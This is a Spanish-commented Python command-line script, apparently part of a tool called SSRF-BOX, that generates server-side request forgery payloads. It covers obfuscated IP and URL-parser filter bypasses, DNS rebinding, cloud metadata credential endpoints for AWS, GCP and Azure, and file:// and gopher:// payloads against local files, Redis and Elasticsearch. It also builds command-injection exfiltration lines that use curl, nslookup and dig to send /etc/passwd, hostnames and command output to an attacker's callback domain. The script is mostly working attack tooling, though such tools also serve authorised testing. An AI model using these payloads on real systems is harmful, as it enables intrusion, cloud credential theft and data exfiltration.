#!/usr/bin/env python3
"""
SSRF-BOX CLI Payload Generator
Genera payloads SSRF sin necesitar el servidor arriba.
Uso: python3 generate-payloads.py --type ssrf --domain oob.tudominio.com
"""

import argparse
import base64
import json
import uuid as uuidlib
from typing import List, Dict

RESET = "\033[0m"
GREEN = "\033[32m"
CYAN = "\033[36m"
YELLOW = "\033[33m"
MAGENTA = "\033[35m"
RED = "\033[31m"
BOLD = "\033[1m"
DIM = "\033[2m"


def uid() -> str:
    return str(uuidlib.uuid4())[:8]


def gen_oob(uuid: str, domain: str) -> List[Dict]:
    return [
        {"payload": f"http://{uuid}.{domain}", "desc": "OOB básico DNS+HTTP", "technique": "oob-basic"},
        {"payload": f"https://{uuid}.{domain}", "desc": "OOB HTTPS", "technique": "oob-https"},
        {"payload": f"//{uuid}.{domain}/x", "desc": "Schema-relative", "technique": "oob-relative"},
        {"payload": f"http://{uuid}.{domain}/ssrf", "desc": "Con path para diferenciar DNS-only vs HTTP", "technique": "oob-path"},
    ]


def gen_ip_bypass(target: str, uuid: str, domain: str) -> List[Dict]:
    """Genera variantes ofuscadas de una IP para evadir filtros."""
    parts = [int(x) for x in target.split(".")]
    a, b, c, d = parts
    decimal = (a << 24) | (b << 16) | (c << 8) | d

    entries = [
        {"payload": f"http://{decimal}/", "desc": f"Decimal ({target})", "technique": "ip-decimal"},
        {"payload": f"http://0x{decimal:08x}/", "desc": f"Hex ({target})", "technique": "ip-hex"},
        {"payload": f"http://0{a:o}.0{b:o}.0{c:o}.0{d:o}/", "desc": f"Octal ({target})", "technique": "ip-octal"},
        {"payload": f"http://0x{a:02x}.0x{b:02x}.0x{c:02x}.0x{d:02x}/", "desc": "Hex con puntos", "technique": "ip-hex-dotted"},
    ]

    if target == "127.0.0.1":
        entries += [
            {"payload": "http://[::1]/", "desc": "IPv6 loopback compacto", "technique": "ip-ipv6"},
            {"payload": "http://[::ffff:127.0.0.1]/", "desc": "IPv4-mapped IPv6", "technique": "ip-ipv4mapped"},
            {"payload": "http://127.1/", "desc": "IP corta", "technique": "ip-short"},
            {"payload": "http://0/", "desc": "IP cero (0.0.0.0)", "technique": "ip-zero"},
            {"payload": "http://localhost/", "desc": "localhost keyword", "technique": "ip-localhost"},
            {"payload": "http://localtest.me/", "desc": "localtest.me resuelve a 127.0.0.1", "technique": "ip-localtest"},
        ]

    # URL parser differentials
    entries += [
        {"payload": f"http://evil.{uuid}.{domain}@{target}/", "desc": "Userinfo trick", "technique": "parser-userinfo"},
        {"payload": f"http://{target}%23@evil.{uuid}.{domain}/", "desc": "Fragment trick (#)", "technique": "parser-fragment"},
        {"payload": f"http://{target}%09evil.{uuid}.{domain}/", "desc": "Tab injection", "technique": "parser-tab"},
        {"payload": f"http://{target}%2fevil.{uuid}.{domain}/", "desc": "Encoded slash", "technique": "parser-slash"},
    ]
    return entries


def gen_rebind(uuid: str, domain: str, public_ip: str, private_ip: str) -> List[Dict]:
    rebind_fqdn = f"rebind-{uuid}.{domain}"
    return [
        {
            "payload": f"http://{rebind_fqdn}/",
            "desc": f"DNS Rebinding: 1ª→{public_ip} (bypass), 2ª→{private_ip} (exploit)",
            "technique": "dns-rebinding",
            "setup": f"POST /api/rebind {{uuid:{uuid}, public_ip:{public_ip}, private_ip:{private_ip}, switch_after:1}}",
        },
        {
            "payload": f"http://{rebind_fqdn}/latest/meta-data/iam/security-credentials/",
            "desc": "Rebinding + AWS metadata",
            "technique": "dns-rebinding-aws",
        },
    ]


def gen_cloud(uuid: str, domain: str) -> List[Dict]:
    return [
        {"payload": "http://169.254.169.254/latest/meta-data/", "desc": "AWS IMDSv1 root", "technique": "cloud-aws"},
        {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "desc": "AWS IAM credentials listing", "technique": "cloud-aws-iam"},
        {"payload": "http://169.254.169.254/latest/user-data", "desc": "AWS user-data (secrets)", "technique": "cloud-aws-userdata"},
        {"payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "desc": "GCP service account token", "technique": "cloud-gcp"},
        {"payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "desc": "Azure IMDS instance info", "technique": "cloud-azure"},
        {"payload": "https://kubernetes.default.svc/api/v1/", "desc": "Kubernetes API interno", "technique": "cloud-k8s"},
        {"payload": f"http://{uuid}.{domain}/confirm-cloud-access", "desc": "OOB para confirmar alcance a metadata cloud", "technique": "cloud-oob"},
    ]


def gen_protocols(uuid: str, domain: str) -> List[Dict]:
    return [
        {"payload": "file:///etc/passwd", "desc": "Lectura /etc/passwd", "technique": "file://"},
        {"payload": "file:///proc/self/environ", "desc": "Variables de entorno (secrets)", "technique": "file-proc"},
        {"payload": "dict://127.0.0.1:6379/info", "desc": "Redis INFO vía dict://", "technique": "dict-redis"},
        {"payload": "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a", "desc": "Redis INFO vía gopher://", "technique": "gopher-redis"},
        {"payload": "gopher://127.0.0.1:9200/_GET+/_cat/indices+HTTP/1.0%0d%0a%0d%0a", "desc": "Elasticsearch via gopher://", "technique": "gopher-es"},
        {"payload": "ldap://127.0.0.1:389/", "desc": "LDAP scan", "technique": "ldap"},
        {"payload": "smtp://127.0.0.1:25/", "desc": "SMTP scan", "technique": "smtp"},
        {"payload": "ftp://127.0.0.1:21/", "desc": "FTP scan", "technique": "ftp"},
    ]


def gen_exfil(uuid: str, domain: str) -> List[Dict]:
    # Ejemplos de cómo codificar datos en subdominios DNS
    sample_b64 = base64.b64encode(b"whoami").decode().rstrip("=")
    return [
        {"payload": f"http://$(whoami).{uuid}.{domain}/", "desc": "Command injection via subdomain", "technique": "exfil-cmd"},
        {"payload": f"http://`id | base64`.{uuid}.{domain}/", "desc": "Base64-encoded exfil via DNS", "technique": "exfil-b64"},
        {"payload": f"nslookup $(cat /etc/hostname).{uuid}.{domain}", "desc": "nslookup hostname exfil", "technique": "exfil-nslookup"},
        {"payload": f"curl http://{uuid}.{domain}/$(cat /etc/passwd | base64 -w0)", "desc": "passwd exfil via HTTP path", "technique": "exfil-http"},
        {"payload": f"dig {sample_b64}.{uuid}.{domain}", "desc": f"Manual DNS exfil (base64: 'whoami')", "technique": "exfil-dig"},
    ]


GENERATORS = {
    "oob":      gen_oob,
    "ssrf":     gen_oob,
    "bypass":   gen_ip_bypass,
    "rebind":   gen_rebind,
    "cloud":    gen_cloud,
    "protocol": gen_protocols,
    "exfil":    gen_exfil,
}


def print_entry(e: Dict, idx: int):
    technique = e.get("technique", "")
    desc = e.get("desc", "")
    payload = e.get("payload", "")
    setup = e.get("setup", "")

    print(f"\n  {DIM}[{idx:02d}]{RESET} {CYAN}{technique}{RESET}")
    print(f"  {DIM}Desc:{RESET} {desc}")
    print(f"  {GREEN}{payload}{RESET}")
    if setup:
        print(f"  {DIM}Setup:{RESET} {YELLOW}{setup}{RESET}")


def main():
    parser = argparse.ArgumentParser(
        description="SSRF-BOX CLI — Generador de payloads offline",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument("--type", default="all",
        choices=["all", "oob", "ssrf", "bypass", "rebind", "cloud", "protocol", "exfil"],
        help="Tipo de payload a generar")
    parser.add_argument("--domain", default="oob.example.com", help="Dominio OOB (ej: oob.tudominio.com)")
    parser.add_argument("--target", default="127.0.0.1", help="IP objetivo para bypass (default: 127.0.0.1)")
    parser.add_argument("--public-ip", default="1.1.1.1", help="IP pública para rebinding")
    parser.add_argument("--private-ip", default="169.254.169.254", help="IP privada/interna para rebinding")
    parser.add_argument("--uuid", default=None, help="UUID personalizado (default: aleatorio)")
    parser.add_argument("--output", default=None, help="Guardar output en fichero JSON")
    args = parser.parse_args()

    session_uuid = args.uuid or uid()

    print(f"\n{BOLD}SSRF-BOX Payload Generator{RESET}")
    print(f"  UUID:   {CYAN}{session_uuid}{RESET}")
    print(f"  Dominio: {CYAN}{args.domain}{RESET}")
    print(f"  Tipo:   {YELLOW}{args.type}{RESET}\n")

    all_payloads = {}

    types_to_gen = list(GENERATORS.keys()) if args.type == "all" else [args.type]

    for ptype in types_to_gen:
        gen = GENERATORS[ptype]
        try:
            if ptype == "bypass":
                entries = gen(args.target, session_uuid, args.domain)
            elif ptype == "rebind":
                entries = gen(session_uuid, args.domain, args.public_ip, args.private_ip)
            else:
                entries = gen(session_uuid, args.domain)
        except Exception as ex:
            print(f"{RED}Error generando {ptype}: {ex}{RESET}")
            continue

        print(f"\n{BOLD}{MAGENTA}── {ptype.upper()} ──────────────────────────────────────────{RESET}")
        for i, e in enumerate(entries, 1):
            print_entry(e, i)
        all_payloads[ptype] = entries

    if args.output:
        with open(args.output, "w") as f:
            json.dump({"uuid": session_uuid, "domain": args.domain, "payloads": all_payloads}, f, indent=2)
        print(f"\n{GREEN}Payloads guardados en {args.output}{RESET}")

    print(f"\n{DIM}Callback esperado en: {RESET}{CYAN}*.{session_uuid}.{args.domain}{RESET}\n")


if __name__ == "__main__":
    main()
